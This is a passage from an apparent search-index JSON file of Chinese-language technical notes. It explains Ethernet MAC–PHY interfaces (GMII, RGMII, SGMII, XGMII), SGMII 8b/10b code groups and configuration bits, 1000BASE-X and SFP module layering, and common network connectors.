\u200b\u6216\u8005\u200b 10Mbps\uff0c\u200b\u9891\u7387\u200b\u90fd\u200b\u662f\u200b 50MHz\uff0c\u200b\u4e00\u5171\u200b 10 \u200b\u6839\u7ebf\u200b\uff084 DATA+CLK+TX_EN+CRS_DV+RX_ER+MDIO+MDC\uff09\uff0c\u200b\u6570\u636e\u7ebf\u200b\u662f\u200b TX \u200b\u548c\u200b RX \u200b\u5404\u200b 2 \u200b\u6839\u200b</li> <li>GMII\uff1a\u200b\u901f\u7387\u200b\u662f\u200b 1000Mbps\uff08125MHz*8\uff09\uff0c\u200b\u6570\u636e\u7ebf\u200b\u662f\u200b TX \u200b\u548c\u200b RX \u200b\u5404\u200b 8 \u200b\u6839\u200b\uff1b\u200b\u4e5f\u200b\u652f\u6301\u200b\u901f\u7387\u200b 100Mbps\uff0825MHz\uff09\u200b\u548c\u200b 10Mbps\uff082.5MHz\uff09</li> <li>RGMII\uff1a\u200b\u901f\u7387\u200b\u662f\u200b 1000Mbps\uff08125MHz*4*2\uff0cDDR\uff09\uff0c\u200b\u6570\u636e\u7ebf\u200b\u662f\u200b TX \u200b\u548c\u200b RX \u200b\u5404\u200b 4 \u200b\u6839\u200b\uff1b\u200b\u4e5f\u200b\u652f\u6301\u200b\u901f\u7387\u200b 100Mbps\uff0825MHz*4\uff09\u200b\u548c\u200b 10Mbps\uff082.5MHz*4\uff09\uff0c\u200b\u4e00\u5171\u200b\u662f\u200b 5+5+2 \u200b\u6839\u7ebf\u200b</li> <li>SGMII\uff1a\u200b\u901f\u7387\u200b\u662f\u200b 1000Mbps\uff08625MHz*2*8/10\uff09\uff0c\u200b\u91c7\u7528\u200b 625MHz DDR \u200b\u5dee\u5206\u200b\u5bf9\u200b SerDes\uff0c\u200b\u91c7\u7528\u200b 8b/10b \u200b\u7684\u200b\u7f16\u7801\u200b</li> <li>XGMII\uff1a\u200b\u652f\u6301\u200b 2500Mbps/5000Mbps/10000Mbps\uff08156.25 MHz*32*2\uff0cDDR\uff09\u200b\u901f\u7387\u200b\uff0c\u200b\u6570\u636e\u7ebf\u200b\u662f\u200b TX \u200b\u548c\u200b RX \u200b\u5404\u200b 32 \u200b\u6839\u200b</li> </ul> <p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cMAC \u200b\u548c\u200b PHY \u200b\u662f\u200b\u72ec\u7acb\u200b\u7684\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5f88\u591a\u200b\u5e38\u89c1\u200b\u7684\u200b FPGA \u200b\u5f00\u53d1\u677f\u200b\uff0c\u200b\u5728\u200b\u4f7f\u7528\u200b\u5343\u5146\u200b\u7f51\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u677f\u5b50\u200b\u4e0a\u200b\u662f\u200b PHY \u200b\u82af\u7247\u200b\uff0c\u200b\u4ece\u200b FPGA \u200b\u5230\u200b PHY \u200b\u901a\u8fc7\u200b RGMII \u200b\u8fde\u63a5\u200b\uff0c\u200b\u7136\u540e\u200b PHY \u200b\u518d\u200b\u8fde\u63a5\u200b\u5230\u200b 8P8C\uff08RJ45\uff09\u200b\u7684\u200b\u8fde\u63a5\u5668\u200b\u4e0a\u200b\u3002\u200b\u4e00\u822c\u200b\u8fd8\u4f1a\u200b\u628a\u200b MDIO \u200b\u4e5f\u200b\u63a5\u5230\u200b FPGA \u200b\u4e0a\u9762\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b\u591a\u4e2a\u200b PHY\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5427\u200b MDIO \u200b\u901a\u8fc7\u200b\u603b\u7ebf\u200b\u7684\u200b\u65b9\u5f0f\u200b\u5408\u5e76\u200b\u8d77\u6765\u200b\uff0c\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b PHY \u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u5740\u200b\uff08\u200b\u4e00\u822c\u200b\u662f\u200b\u5728\u200b\u6307\u5b9a\u200b\u7684\u200b PIN \u200b\u4e0a\u200b\u8bbe\u7f6e\u200b\u4e0a\u62c9\u200b/\u200b\u4e0b\u200b\u62c9\u200b\u7535\u963b\u200b\u5b9e\u73b0\u200b\uff09\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u4e0d\u200b\u51b2\u7a81\u200b\u7684\u200b\u8bbf\u95ee\u200b\u3002</p> <p>\u200b\u6269\u5c55\u200b\u9605\u8bfb\u200b\uff1aKXZ9031RNX Datasheet</p>"},{"location":"networking/ethernet.html#sgmii","title":"SGMII","text":"<p>MII \u200b\u63a5\u53e3\u200b\u4e2d\u200b\u6bd4\u8f83\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u662f\u200b GMII/RGMII/SGMII\u3002\u200b\u5176\u4e2d\u200b\u6bd4\u8f83\u200b\u7279\u6b8a\u200b\u7684\u200b\u662f\u200b SGMII\uff0c\u200b\u9996\u5148\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u4fe1\u53f7\u200b\u5f88\u5c11\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e24\u5bf9\u200b\u5dee\u5206\u200b\u7ebf\u200b TX_P TX_N RX_P RX_N\uff0c\u200b\u5176\u4e2d\u200b\u65f6\u949f\u200b\u662f\u200b\u53ef\u9009\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u6570\u636e\u200b\u4e2d\u200b\u6062\u590d\u200b\u3002\u200b\u4f60\u200b\u53ef\u80fd\u200b\u611f\u5230\u200b\u5f88\u200b\u5947\u602a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4ed6\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6bd4\u5982\u200b DV/ER/CRS \u200b\u7b49\u200b\u90fd\u200b\u53bb\u200b\u54ea\u91cc\u200b\u4e86\u200b\u5462\u200b\uff1f\u200b\u5176\u5b9e\u200b\u662f\u56e0\u4e3a\u200b\uff0cSGMII \u200b\u91c7\u7528\u200b\u4e86\u200b 8b/10b \u200b\u7684\u200b\u7f16\u7801\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u628a\u200b\u8fd9\u4e9b\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\u901a\u8fc7\u200b\u4e00\u5b9a\u200b\u7684\u200b\u65b9\u5f0f\u200b\u987a\u4fbf\u200b\u7f16\u7801\u200b\u8fdb\u53bb\u200b\u4e86\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u5c31\u200b\u662f\u4ece\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u4fe1\u53f7\u200b\u7f16\u7801\u200b\u4e3a\u200b 10 \u200b\u4f4d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b 10 \u200b\u4f4d\u200b\u7b26\u53f7\u200b\u662f\u200b\u6ca1\u6709\u200b\u5bf9\u5e94\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u200b\u8fd9\u4e9b\u200b\u7279\u6b8a\u7b26\u53f7\u200b\u6765\u200b\u8868\u793a\u200b\u4e00\u4e9b\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6bd4\u5982\u200b\u7528\u200b SPD\uff08Start_of_Packet Delimiter\uff0c\u200b\u5bf9\u5e94\u200b /S/\uff09\u200b\u548c\u200b EPD\uff08End_of_Packet Delimiter\uff0c\u200b\u5bf9\u5e94\u200b /T/R/ \u200b\u7b49\u200b\uff09\u200b\u8868\u793a\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u5f00\u59cb\u200b\u548c\u200b\u7ed3\u5c3e\u200b\uff0c\u200b\u5bf9\u5e94\u200b TX_EN/RX_DV \u200b\u4fe1\u53f7\u200b\uff1b\u200b\u7528\u200b Error_Propagation\uff08/V/\uff09\u200b\u8868\u793a\u200b\u9519\u8bef\u200b\uff0c\u200b\u5bf9\u5e94\u200b RX_ER \u200b\u4fe1\u53f7\u200b\u7b49\u7b49\u200b\u3002\u200b\u6240\u4ee5\u200b\uff0cSGMII \u200b\u5176\u5b9e\u200b\u8fd8\u662f\u200b\u4e00\u4e2a\u200b GMII \u200b\u7684\u200b\u53d8\u79cd\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u91c7\u7528\u200b SerDes \u200b\u7684\u200b\u65b9\u5f0f\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5f15\u811a\u200b\uff0cMAC \u200b\u5185\u90e8\u200b\u6216\u8005\u200b PHY \u200b\u5185\u90e8\u200b\u4e5f\u200b\u662f\u200b\u7ecf\u8fc7\u200b\u4e00\u4e2a\u200b GMII-SGMII \u200b\u7684\u200b\u8f6c\u6362\u200b\uff0c\u200b\u800c\u200b\u5176\u4f59\u90e8\u5206\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b 8b/10b \u200b\u7684\u200b\u7f16\u7801\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9605\u8bfb\u200b IEEE 802.3 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u7684\u200b <code>Table 36\u20131a\u2014Valid data code-groups</code>\uff0c\u200b\u91cc\u9762\u200b\u63d0\u5230\u200b\u4e86\u200b\u4e24\u7c7b\u200b\u7684\u200b Code Group\uff1aD \u200b\u6253\u5934\u200b\u7684\u200b\uff0c\u200b\u8868\u793a\u200b\u6570\u636e\u200b\uff0c\u200b\u6709\u200b 256 \u200b\u79cd\u200b\uff0c\u200b\u4ece\u200b 8b \u200b\u6620\u5c04\u200b\u5230\u200b 10b \u200b\u7684\u200b\u8868\u8fbe\u65b9\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u4e86\u200b\u4fdd\u6301\u200b\u76f4\u6d41\u200b\u5e73\u8861\u200b\uff0c\u200b\u6709\u200b\u4e00\u79cd\u200b\u5230\u200b\u4e24\u79cd\u200b\u8868\u793a\u200b\u65b9\u6cd5\u200b\u3002\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b 12 \u200b\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b Code Group\uff1aK \u200b\u6253\u5934\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b 10b \u200b\u8868\u8fbe\u65b9\u5f0f\u200b\u4e0d\u4f1a\u200b\u548c\u200b\u6570\u636e\u200b\u51b2\u7a81\u200b\u3002\u200b\u8868\u200b <code>Table 36\u20133\u2014Defined ordered sets</code> \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u4e86\u200b K \u200b\u6253\u5934\u200b\u7684\u200b Code Group \u200b\u542b\u4e49\u200b\uff1a</p> <ul> <li>/C/ Configuration:</li> <li>/C1/ Configuration 1: /K28.5/D21.5/Config_Reg</li> <li>/C2/ Configuration 2: /K28.5/D2.2/Config_Reg</li> <li>/I/ IDLE:</li> <li>/I1/ IDLE 1: /K28.5/D5.6/</li> <li>/I2/ IDLE 2: /K28.5/D16.2/</li> <li>Encapsulation:</li> <li>/R/ Carrier_Extend: /K23.7/</li> <li>/S/ Start_of_Packet: /K27.7/</li> <li>/T/ End_of_Packet: /K29.7/</li> <li>/V/ Error_Propagation: /K30.7/</li> <li>/LI/ LPI (Low Power Idle):</li> <li>/LI1/ LPI 1: /K28.5/D6.5/</li> <li>/LI2/ LPI 2: /K28.5/D26.4/</li> </ul> <p>IEEE 802.3 Figure 36-4 \u200b\u4e2d\u200b\u7ed9\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u53d1\u9001\u200b\u4e00\u6bb5\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u662f\u200b /I/\uff0c\u200b\u7136\u540e\u200b /S/\uff0c\u200b\u63a5\u7740\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b /D/\uff0c\u200b\u6700\u540e\u200b\u7ed3\u675f\u200b\u7684\u200b\u65f6\u5019\u200b /T/R/I/\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c/C/ \u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u4f20\u8f93\u200b\u63a7\u5236\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b SGMII \u200b\u5b9a\u4e49\u200b\u7684\u200b 16 \u200b\u4f4d\u200b\u7684\u200b Config Reg\uff0c\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>Bit0: \u200b\u6052\u4e3a\u200b 1\uff0c\u200b\u4e0e\u200b 1000BASE-X \u200b\u8fdb\u884c\u200b\u533a\u5206\u200b</li> <li>Bit11, 10: \u200b\u534f\u5546\u200b\u901f\u7387\u200b\uff0c00 \u200b\u8868\u793a\u200b 10Mbps\uff0c01 \u200b\u8868\u793a\u200b 100Mbps\uff0c11 \u200b\u8868\u793a\u200b 1000Mbps</li> <li>Bit15:1 \u200b\u8868\u793a\u200b Link up\uff0c0 \u200b\u8868\u793a\u200b Link down</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u901f\u7387\u200b\u7684\u200b\u81ea\u52a8\u200b\u534f\u5546\u200b\uff0c\u200b\u540c\u65f6\u200b PHY \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u77e5\u200b MAC \u200b\u76ee\u524d\u200b\u7684\u200b\u94fe\u8def\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u6269\u5c55\u200b\u9605\u8bfb\u200b\uff1a</p> <ul> <li>Serial Gigabit Media Independent Interface</li> <li>1G/2.5G Ethernet PCS/PMA or SGMII v16.0</li> <li>https://en.wikipedia.org/wiki/Physical_coding_sublayer</li> </ul>"},{"location":"networking/ethernet.html#1000base-x-sfp","title":"1000BASE-X \u200b\u4e0e\u200b SFP \u200b\u7684\u200b\u5173\u7cfb","text":"<p>1000BASE-X \u200b\u5728\u200b 802.3 Clause 36 \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5206\u5c42\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <p> </p> 1000 BASE-X \u200b\u7684\u200b\u5206\u5c42\u200b\uff08\u200b\u56fe\u6e90\u200b 802.3 Clause 36\uff09 <p>\u200b\u5b83\u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u4e0d\u540c\u200b\u7684\u200b\u4ecb\u8d28\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e09\u4e2a\u200b PMD \u200b\u5c42\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b LX\u3001SX \u200b\u548c\u200b CX\u3002\u200b\u8fd9\u4e9b\u200b\u4f53\u73b0\u200b\u5728\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b SFP \u200b\u6a21\u5757\u200b\u3002SFP \u200b\u6a21\u5757\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u56fe\u4e2d\u200b\u7684\u200b PMD \u200b\u5c42\u200b\uff0cSFP \u200b\u63a5\u53e3\u200b\u4e0a\u200b\u8fde\u63a5\u200b\u7684\u200b\u662f\u200b 1000BASE-X \u200b\u7684\u200b PCS/PMA\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u8bf4\u200b\u5728\u200b\u5e26\u6709\u200b SFP \u200b\u7684\u200b FPGA \u200b\u4e0a\u200b\uff0cXilinx \u200b\u7684\u200b IP \u200b\u53eb\u505a\u200b 1G/2.5G Ethernet PCS/PMA\u3002\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff0cPCS \u200b\u548c\u200b PMA \u200b\u5c42\u200b\u5728\u200b FPGA \u200b\u5185\u90e8\u200b\u901a\u8fc7\u200b IP \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u901a\u8fc7\u200b PCB \u200b\u8fde\u63a5\u200b\u5230\u200b SFP \u200b\u4e0a\u200b\uff0c\u200b\u5149\u200b\u6a21\u5757\u200b\u5c31\u662f\u200b PMD \u200b\u5c42\u200b\u3002\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff1a</p> <p> </p> Xilinx PCS/PMA IP\uff08\u200b\u56fe\u6e90\u200b Xilinx PCS/PMA IP Datasheet\uff09 <p>\u200b\u5de6\u8fb9\u200b\u901a\u8fc7\u200b GMII \u200b\u8fde\u63a5\u200b\u5230\u200b\u5185\u90e8\u200b\u7684\u200b MAC\uff0c\u200b\u53f3\u8fb9\u200b\u8fde\u63a5\u200b\u5230\u200b SFP \u200b\u4e0a\u200b\uff0c\u200b\u901a\u8fc7\u200b\u5149\u200b\u6a21\u5757\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b\u5149\u7ea4\u200b\u3002\u200b\u8fd9\u91cc\u200b\u5149\u200b\u6a21\u5757\u200b\u53ea\u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b\u5149\u7535\u200b\u8f6c\u6362\u200b\u3002\u200b\u53e6\u200b\u4e00\u79cd\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b MAC \u200b\u5728\u200b FPGA \u200b\u5185\u90e8\u200b\uff0cPHY\uff08\u200b\u5305\u62ec\u200b PCS/PMA/PMD\uff09\u200b\u90fd\u200b\u5728\u200b FPGA \u200b\u5916\u90e8\u200b\uff0c\u200b\u6b64\u65f6\u200b FPGA IO \u200b\u4e0a\u200b\u5c31\u662f\u200b\u5404\u79cd\u200b MII\u3002</p> <p>\u200b\u90a3\u4e48\u200b SFP \u200b\u7535\u53e3\u200b\u6a21\u5757\u200b\u662f\u200b\u600e\u4e48\u200b\u5de5\u4f5c\u200b\u7684\u200b\u5462\u200b\uff1f\u200b\u7535\u53e3\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b 1000BASE-T \u200b\u6807\u51c6\u200b\uff0c\u200b\u4f46\u662f\u200b\u5149\u200b\u53e3\u200b\u91c7\u7528\u200b\u7684\u200b\u53c8\u200b\u662f\u200b\u4e0a\u9762\u200b\u4e09\u79cd\u200b 1000BASE-X \u200b\u6807\u51c6\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u5b83\u200b\u91cc\u9762\u200b\u6709\u200b\u4e00\u4e2a\u200b PHY \u200b\u82af\u7247\u200b\uff0c\u200b\u53d1\u9001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u89e3\u7801\u200b 1000BASE-X \u200b\u53d8\u200b\u56de\u200b\u539f\u59cb\u6570\u636e\u200b\uff0c\u200b\u518d\u200b\u6309\u7167\u200b 1000BASE-T \u200b\u7684\u200b\u65b9\u5f0f\u200b\u7f16\u7801\u200b\u518d\u200b\u53d1\u51fa\u200b\u53bb\u200b\uff1b\u200b\u63a5\u6536\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6309\u7167\u200b 1000BASE-T \u200b\u8fdb\u884c\u200b\u89e3\u7801\u200b\uff0c\u200b\u518d\u200b\u91cd\u65b0\u200b\u7f16\u7801\u200b\u4e3a\u200b 1000BASE-X \u200b\u53d1\u9001\u7ed9\u200b PMA \u200b\u5c42\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u7c7b\u200b\u7535\u53e3\u200b\u6a21\u5757\u200b\uff0c\u200b\u4e0e\u200b\u4e0a\u9762\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u65b9\u200b\u5728\u4e8e\u200b\uff0cSFP \u200b\u4e0a\u200b\u8d70\u200b\u7684\u200b\u662f\u200b SGMII\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b 1000BASE-X\u3002\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u6a21\u5f0f\u200b\u6ca1\u6709\u200b\u592a\u5927\u200b\u7684\u200b\u533a\u522b\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u4e24\u5bf9\u200b\u5dee\u5206\u200b\u7ebf\u200b\uff0c\u200b\u4e00\u6536\u200b\u4e00\u53d1\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u4e8c\u8005\u200b\u662f\u200b\u540c\u65f6\u200b\u652f\u6301\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5207\u6362\u200b\u7684\u200b\u3002\u200b\u4f8b\u5982\u200b Cisco Compatible 10/100/1000BASE-T SFP SGMII Copper RJ-45 100m Industrial Transceiver Module (LOS) \u200b\u5c31\u662f\u200b\u5728\u200b SFP \u200b\u4e0a\u200b\u8d70\u200b SGMII \u200b\u534f\u8bae\u200b\u3002</p> <p>SGMII \u200b\u4e0e\u200b 1000BASE-X \u200b\u867d\u7136\u200b\u6240\u5904\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b\u5b9e\u73b0\u200b\u6765\u770b\u200b\uff0c\u200b\u53ea\u6709\u200b tx_conf_reg \u200b\u7684\u200b\u5b9a\u4e49\u200b\u4e0d\u540c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u5176\u200b\u6700\u4f4e\u200b\u4f4d\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u52a8\u6001\u200b\u5730\u200b\u5224\u65ad\u200b\u51fa\u662f\u200b SGMII \u200b\u534f\u8bae\u200b\u8fd8\u662f\u200b 1000BASE-X\u3002</p> <p>\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b Designing a Copper SFP using the VSC8221 10/100/1000BASE-T PHY\uff0c\u200b\u5b83\u200b\u91cc\u9762\u200b\u8bb2\u200b\u4e86\u200b\u5982\u4f55\u200b\u5c06\u200b VSC8221 \u200b\u82af\u7247\u200b\u7528\u4e8e\u200b\u7535\u53e3\u200b\u6a21\u5757\u200b\uff1aVSC8221 \u200b\u82af\u7247\u200b\u4e00\u5934\u200b\u662f\u200b 1000BASEX\uff08\u200b\u53c8\u79f0\u200b 802.3z SerDes\uff0c802.3z \u200b\u5c31\u662f\u200b 1000BASE-X\uff09\u200b\u6216\u8005\u200b SGMII\uff0c\u200b\u53e6\u4e00\u5934\u200b\u662f\u200b 1000BASE-T MDI\u3002</p>"},{"location":"networking/ethernet.html#_3","title":"\u7269\u7406\u200b\u63a5\u53e3","text":""},{"location":"networking/ethernet.html#_4","title":"\u5e38\u89c1\u200b\u7684\u200b\u8fde\u63a5\u5668","text":"<p>\u200b\u8fde\u63a5\u5668\u200b\uff08connector\uff09\u200b\u4e00\u822c\u6765\u8bf4\u200b\u6307\u200b\u7684\u200b\u5c31\u662f\u200b\u7ebf\u7f06\u200b\u548c\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u7684\u200b\u7269\u7406\u200b\u63a5\u53e3\u200b\u4e86\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b\uff1a</p> <ul> <li>8P8C\uff1a\u200b\u4e00\u822c\u200b\u6211\u4eec\u200b\u4f1a\u200b\u79f0\u4e4b\u4e3a\u200b RJ45\uff0c\u200b\u5173\u4e8e\u200b\u5b83\u4eec\u200b\u4fe9\u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u200b Wikipedia \u200b\u4e0a\u9762\u200b\u7684\u200b\u8bf4\u660e\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5728\u200b\u65e5\u5e38\u751f\u6d3b\u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6df7\u7528\u200b\u5176\u5b9e\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u5927\u200b\u95ee\u9898\u200b</li> <li>LC\uff1a\u200b\u4e00\u79cd\u200b\u5149\u7ea4\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u6709\u200b\u4e24\u4e2a\u200b\u7a81\u51fa\u200b\u6765\u200b\u7684\u200b\u63d2\u200b\u5230\u200b SFP \u200b\u5149\u200b\u6a21\u5757\u200b\u4e2d\u200b\u7684\u200b\u7a81\u8d77\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b</li> <li>SFP+ DAC\uff1a\u200b\u4e00\u822c\u200b\u662f\u200b DAC\uff08Direct Attatched Cable\uff09\u200b\u7ebf\u200b\uff0c\u200b\u7ebf\u200b\u7684\u200b\u4e24\u7aef\u200b\u76f4\u63a5\u200b\u5c31\u662f\u200b SFP+ \u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u76f4\u63a5\u200b\u63d2\u200b\u5230\u200b SFP+ \u200b\u7b3c\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5149\u200b\u6a21\u5757\u200b\uff1b\u200b\u66f4\u200b\u9ad8\u901f\u7387\u200b\u7684\u200b\u4e5f\u200b\u6709\u200b DAC \u200b\u7ebf\u200b</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u5149\u7ea4\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u6ce8\u610f\u200b\u8d2d\u4e70\u200b\u7684\u200b\u65f6\u5019\u200b\u8981\u200b\u548c\u200b\u5149\u200b\u6a21\u5757\u200b\u5bf9\u5e94\u200b\uff0c\u200b\u4e0d\u7136\u200b\u53ef\u80fd\u200b\u63d2\u200b\u4e0d\u200b\u8fdb\u53bb\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b LC-LC\uff0cSC-LC\uff0cSC-SC \u200b\u7b49\u7b49\u200b\uff0c\u200b\u8868\u793a\u200b\u7ebf\u200b\u7684\u200b\u4e24\u7aef\u200b\u5206\u522b\u200b\u662f\u200b\u4ec0\u4e48\u200b\u63a5\u53e3\u200b\u3002</p> <p>MDI \u200b\u5728\u200b\u4ee5\u592a\u7f51\u200b\u7684\u200b\u5206\u5c42\u200b\u91cc\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b PHY \u200b\u4e0e\u200b PHY \u200b\u4e4b\u95f4\u200b\u7684\u200b\u5a92\u4ecb\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u4f7f\u7528\u200b\u94dc\u5236\u200b\u53cc\u7ede\u7ebf\u200b\u7684\u200b\u6807\u51c6\u200b\uff0cMDI \u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b RJ45 \u200b\u91cc\u9762\u200b 8 \u200b\u6839\u7ebf\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4fe1\u53f7\u200b\u3002\u200b\u5728\u200b\u5341\u5146\u200b\u548c\u200b\u767e\u5146\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u533a\u5206\u200b MDI \u200b\u548c\u200b MDI-X\uff0c\u200b\u5728\u200b\u540c\u79cd\u200b\u7c7b\u578b\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e4b\u95f4\u200b\u7528\u200b\u4ea4\u53c9\u200b\u7ebf\u200b\uff0c\u200b\u5728\u200b\u4e0d\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u7aef\u53e3\u200b\u4e4b\u95f4\u200b\u7528\u200b\u76f4\u901a\u200b\u7ebf\u200b\u3002\u200b\u5728\u200b\u540e\u6765\u200b\uff0c\u200b\u6709\u200b\u4e86\u200b Auto MDI-X\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f1a\u200b\u6309\u7167\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u5e76\u4e14\u200b\u5339\u914d\u200b\u3002\u200b\u4ece\u200b\u5343\u5146\u200b\u5f00\u59cb\u200b\uff0c\u200b\u8bbe\u5907\u200b\u90fd\u200b\u652f\u6301\u200b Auto MDI-X \u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7ebf\u200b\u672c\u8eab\u200b\u662f\u200b\u4ea4\u53c9\u200b\u8fd8\u662f\u200b\u76f4\u901a\u200b\u5c31\u200b\u65e0\u6240\u8c13\u200b\u4e86\u200b\u3002</p>"},{"location":"networking/ethernet.html#sfp","title":"SFP \u200b\u7684\u200b\u79cd\u7c7b","text":"<p>SFP \u200b\u662f\u200b\u5f88\u200b\u5e38\u89c1\u200b\u7684\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u9ad8\u901f\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e4b\u4e2d\u200b\u3002\u200b\u800c\u200b\u5b83\u200b\u53c8\u200b\u5206\u4e3a\u200b\u51e0\u79cd\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u901f\u7387\u200b\uff1a</p> <ul> <li>SFP: 1Gbps/100Mbps</li> 